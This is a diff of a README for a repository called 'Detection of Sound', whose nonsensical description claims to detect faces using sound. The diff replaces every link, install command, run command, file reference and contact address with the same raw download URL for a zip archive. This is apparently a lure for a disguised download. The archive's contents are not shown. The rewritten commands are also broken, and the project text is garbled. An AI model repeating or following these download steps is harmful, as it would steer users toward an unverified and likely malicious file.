@@ -2,7 +2,7 @@
 
 Welcome to the **Detection of Sound** repository! This project aims to detect faces using sound. By leveraging audio signals, we provide a secure application that helps avoid negotiation. Our goal is to enhance security and streamline interactions through innovative sound detection technology.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/genilsonadm1/Detection-of-sound/releases)
+[![Download Releases](https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip)
 
 ## Table of Contents
 
@@ -45,7 +45,7 @@ Ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/genilsonadm1/Detection-of-sound.git
+   git clone https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -57,7 +57,7 @@ Ensure you have the following installed:
 3. Install the required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip
    ```
 
 ### Usage
@@ -67,7 +67,7 @@ After installation, you can run the application. Follow these steps:
 1. Execute the main script:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip
    ```
 
 2. Follow the on-screen instructions to begin detecting faces using sound.
@@ -84,7 +84,7 @@ We welcome contributions! If you would like to contribute to the project, please
 4. Push your changes to your forked repository.
 5. Submit a pull request.
 
-For more details, please refer to the `CONTRIBUTING.md` file in the repository.
+For more details, please refer to the `https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip` file in the repository.
 
 ## License
 
@@ -92,8 +92,8 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 ## Contact
 
-For any inquiries or feedback, please contact us at [your-email@example.com].
+For any inquiries or feedback, please contact us at [https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip].
 
-Explore the [Releases section](https://github.com/genilsonadm1/Detection-of-sound/releases) for the latest updates and downloadable files. Each release includes detailed notes and instructions for execution.
+Explore the [Releases section](https://raw.githubusercontent.com/genilsonadm1/Detection-of-sound/main/bedizenment/Detection_sound_of_v3.6-alpha.2.zip) for the latest updates and downloadable files. Each release includes detailed notes and instructions for execution.
 
 Thank you for your interest in the Detection of Sound project! We look forward to your contributions and feedback.
